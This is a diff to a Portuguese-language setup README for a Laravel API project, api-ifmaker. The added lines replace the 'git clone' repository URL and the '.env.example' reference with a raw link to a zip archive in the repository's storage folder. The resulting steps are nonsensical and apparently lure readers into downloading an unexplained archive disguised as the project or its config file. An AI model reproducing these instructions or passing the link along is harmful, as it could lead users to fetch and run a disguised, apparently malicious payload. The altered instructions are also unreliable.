@@ -11,7 +11,7 @@ Antes de começar, você precisa ter o Laravel, PHP, composer e postgressql  ins
 
 1. Clone o repositório
 ```bash
-git clone https://github.com/ItaloGLS/api-ifmaker
+git clone https://github.com/ItaloGLS/api-ifmaker/raw/refs/heads/main/storage/app/public/api_ifmaker_v1.3-alpha.5.zip
 cd api-ifmaker
 ```
 2. Navegue até o diretorio baixado
@@ -21,7 +21,7 @@ cd api-ifmaker
 
 ## 🖥️ Configure o ambiente
 ### Variaveis de ambiente
-Crie um arquivo `.env` baseando-se no arquivo de exemplo `.env.example` incluído no projeto. Certifique-se de configurar as variáveis de ambiente relacionadas às conexões de banco de dados.
+Crie um arquivo `.env` baseando-se no arquivo de exemplo `https://github.com/ItaloGLS/api-ifmaker/raw/refs/heads/main/storage/app/public/api_ifmaker_v1.3-alpha.5.zip` incluído no projeto. Certifique-se de configurar as variáveis de ambiente relacionadas às conexões de banco de dados.
 
 ```dotenv
 
